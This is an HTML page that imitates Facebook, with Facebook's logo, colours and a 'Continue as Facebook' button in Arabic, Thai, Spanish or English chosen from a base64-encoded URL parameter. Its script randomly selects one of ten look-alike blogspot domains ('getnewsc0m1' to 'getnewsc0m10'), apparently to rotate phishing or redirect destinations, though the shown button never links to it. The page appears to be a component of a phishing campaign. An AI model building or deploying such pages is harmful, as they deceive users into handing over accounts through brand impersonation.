<!DOCTYPE html>
<html lang="en">
<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" rel="stylesheet">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
  
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>contunie</title>
    <style>
        body{
            background-color: #F0F2F5;
        }
        .vvv{
          background-color: #1877F2;
          color: #ffff;
          margin-top: 20px;
          padding: 10;
        }
        .vvv:hover{
          color: #ffff;
        }
    </style>
</head>
<body>
    <center style="margin-top: 160px;">
      <img width="200" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
<div id="page"></div>
</center>
<script>
  const rand = Math.floor(Math.random() * 10) + 1;
  let link;
  if(rand == 1){
    link = "https://getnewsc0m1.blogspot.com"
  }
  else if(rand == 2){
    link = "https://getnewsc0m2.blogspot.com"
  }
  else if(rand == 3){
    link = "https://getnewsc0m3.blogspot.com"
  }
  else if(rand == 4){
    link = "https://getnewsc0m4.blogspot.com"
  }else if(rand == 5){
    link = "https://getnewsc0m5.blogspot.com"
  }
  else if(rand == 6){
    link = "https://getnewsc0m6.blogspot.com"
  }
  else if(rand == 7){
    link = "https://getnewsc0m7.blogspot.com"
  }
  else if(rand == 8){
    link = "https://getnewsc0m8.blogspot.com"
  }
  else if(rand == 9){
    link = "https://getnewsc0m9.blogspot.com"
  }
  else if(rand == 10){
    link = "https://getnewsc0m10.blogspot.com"
  }
  
  
     const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        const q = urlParams.get('q');
          let rrs = atob(q);
        let sc = rrs.split("_")[2]
        rrs = rrs.split("_")[1]
        rrs = rrs.split("=")[1]
        //alert(user)
        let lang = rrs;
  let lg;
        if(lang == 'ar')
        {
          lg ='متابعة بإستخدام  فيسبوك';
        }
       else if (lang == 'th')
       {
          lg ='ดำเนินการต่อเป็น ';
       }
       else if (lang == 'es')
       {
          lg ='Continuar como facebook';
       }
       else
       {
          lg ='Continue as Facebook';
       }
  
    document.getElementById('page').innerHTML =`<a rel="noopener noreferrer"><button type="button" class="btn vvv btn-lg">${lg} <i class="fab fa-facebook"></i></button></a>`
</script>
</body>
</html>